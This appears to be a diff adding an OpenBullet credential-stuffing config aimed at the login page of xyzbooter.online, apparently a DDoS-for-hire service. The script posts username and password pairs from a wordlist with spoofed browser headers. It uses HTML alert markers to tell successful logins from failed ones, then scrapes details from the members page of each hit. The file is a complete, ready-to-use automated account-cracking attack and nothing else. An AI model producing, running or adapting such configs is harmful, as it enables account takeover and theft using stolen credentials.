@@ -1,0 +1,64 @@
+[SETTINGS]
+{
+  "Name": "xyzbooter.online",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2019-07-17T20:39:23.3864363+01:00",
+  "AdditionalInfo": "",
+  "Author": "Coaster",
+  "Version": "1.3.2 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://xyzbooter.online/members/ajax/login.php?type=login" 
+  CONTENT "username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7" 
+  HEADER "cache-control: no-cache" 
+  HEADER "content-length: 35" 
+  HEADER "origin: https://xyzbooter.online" 
+  HEADER "pragma: no-cache" 
+  HEADER "referer: https://xyzbooter.online/members/login.php" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<div class=\"alert alert-block alert-success fade in\">" 
+  KEYCHAIN Retry OR 
+    KEY "<div class=\"alert alert-block alert-danger fade in\"><div class=\"alert alert-block alert-danger fade in\">" 
+  KEYCHAIN Failure OR 
+    KEY "<div class=\"alert alert-block alert-danger fade in\">" 
+
+REQUEST GET "https://xyzbooter.online/members/index.php" 
+  
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "Origin: https://xyzbooter.online" 
+  HEADER "Referer: https://xyzbooter.online/members/index.php" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+
+PARSE "<SOURCE>" LR "\"> <small class=\"text-muted block\"><strong><div style=\"color:orange;\">" "</div></strong></small></div>" -> CAP "Has" 
+
+PARSE "<SOURCE>" LR "text-muted block\"><strong><div style=\"color:orange;\">" "</div></strong></small></div>" -> CAP "Does" 
+
